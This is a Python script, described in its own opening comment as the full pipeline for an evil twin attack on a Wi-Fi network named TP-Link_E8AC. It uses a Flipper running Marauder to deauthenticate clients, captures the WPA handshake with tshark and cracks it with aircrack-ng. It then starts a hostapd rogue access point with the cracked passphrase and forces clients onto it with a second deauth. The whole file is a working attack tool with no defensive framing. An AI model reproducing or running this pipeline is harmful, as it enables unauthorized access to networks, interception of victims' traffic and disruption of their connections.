#still needs to be tested, but this is the full pipeline for the evil twin attack. 
import serial
import time
import subprocess
from pathlib import Path
import re

# --- CONFIGURATION ---
TARGET_SSID = "TP-Link_E8AC"
SERIAL_PORT = "/dev/ttyACM0"  # Change to your Flipper port
BAUD_RATE = 115200
MONITOR_INTERFACE = "wlan0mon"  # Your card in monitor mode
AP_INTERFACE = "wlp2s0"         # Your card for the Evil Twin
PCAP_FILE = Path("./handshake.pcap")
WORDLIST = "mockyou.txt"
CRACKED_KEY_FILE = Path("./cracked_key.txt")

def get_target_info(ser, target_ssid):
    """Scans using Flipper and returns (index, bssid, channel)"""
    print(f"[*] Scanning for {target_ssid} via Flipper...")
    ser.write(b"scanap\r\n")
    time.sleep(15) 
    ser.write(b"stopscan\r\n")
    time.sleep(1)
    ser.write(b"list -a\r\n")
    time.sleep(2)
    
    output = ser.read_all().decode('utf-8', errors='ignore')
    
    # Marauder list usually looks like: INDEX [BSSID] SSID CHANNEL ...
    # Example regex to grab index, BSSID, and Channel
    for line in output.splitlines():
        if target_ssid in line:
            parts = line.split()
            # This parsing depends on your Marauder version; check 'list -a' output format
            # Usually: 0  AA:BB:CC:DD:EE:FF  SSID_NAME  6  ...
            idx = parts[0]
            bssid = parts[1].replace("[", "").replace("]", "")
            channel = parts[3]
            return idx, bssid, channel
    return None, None, None

def break_key(pcap_file, bssid):
    """Break the key using aircrack-ng."""
    print(f"[*] Starting aircrack-ng on {bssid}...")
    subprocess.run([
        "aircrack-ng", "-a", "2",
        "-b", bssid,
        "-l", str(CRACKED_KEY_FILE),
        str(pcap_file),
        "-w", WORDLIST
    ])

def configure_evil_twin(ssid, channel):
    """Creates the hostapd.conf dynamically based on cracked data."""
    if not CRACKED_KEY_FILE.exists():
        print("[-] Cracked key file not found. Cracking might have failed.")
        return False

    with open(CRACKED_KEY_FILE, "r") as f:
        key_text = f.read().strip()
    
    print(f"[+] Configuring Evil Twin with Key: {key_text}")
    
    config = f"""interface={AP_INTERFACE}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=1
wpa=2
wpa_passphrase={key_text}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP"""

    with open("/etc/hostapd/hostapd.conf", "w") as conf_file:
        conf_file.write(config)
    return True

def main():
    # Connect to Flipper
    try:
        ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=1)
    except Exception as e:
        print(f"[-] Serial Error: {e}"); return

    # Get Targets (Index, BSSID, Channel)
    idx, bssid, channel = get_target_info(ser, TARGET_SSID)
    if not idx:
        print("[-] Target not found."); return

    # First Deauth & Capture Handshake
    print("[*] Launching TShark & First Deauth...")
    tshark_proc = subprocess.Popen([
        "tshark", "-i", MONITOR_INTERFACE, 
        "-f", f"ether proto 0x888e and wlan addr3 {bssid}",
        "-w", str(PCAP_FILE), "-c", "4"
    ])
    
    ser.write(f"select -a {idx}\r\n".encode())
    time.sleep(1)
    ser.write(b"attack -t deauth\r\n")
    tshark_proc.wait() # Wait for capture to finish
    print("[+] Handshake captured.")

    # Crack Key
    break_key(PCAP_FILE.resolve(), bssid)

    # Setup Evil Twin
    if configure_evil_twin(TARGET_SSID, channel):
        print("[*] Starting Evil Twin in background...")
        subprocess.run(["sudo", "systemctl", "stop", "wpa_supplicant"]) 
        
        # We use Popen here so the script doesn't stop!
        twin_proc = subprocess.Popen(["sudo", "hostapd", "/etc/hostapd/hostapd.conf"])
        
        # Give the Evil Twin 5 seconds to fully initialize
        time.sleep(5)

        # FINAL DEAUTH: Kick everyone so they move to the Evil Twin
        print(f"[!!!] Sending final deauth to push clients to Evil Twin...")
        ser.write(b"attack -t deauth\r\n")
        
        print("[+] Attack Pipeline Complete.")
        print("[*] Monitoring Evil Twin logs. Press Ctrl+C to stop.")
        
        try:
            # Keep the script alive while hostapd runs
            twin_proc.wait()
        except KeyboardInterrupt:
            print("\n[*] Shutting down Evil Twin...")
            twin_proc.terminate()
            ser.close()

if __name__ == "__main__":
    main()
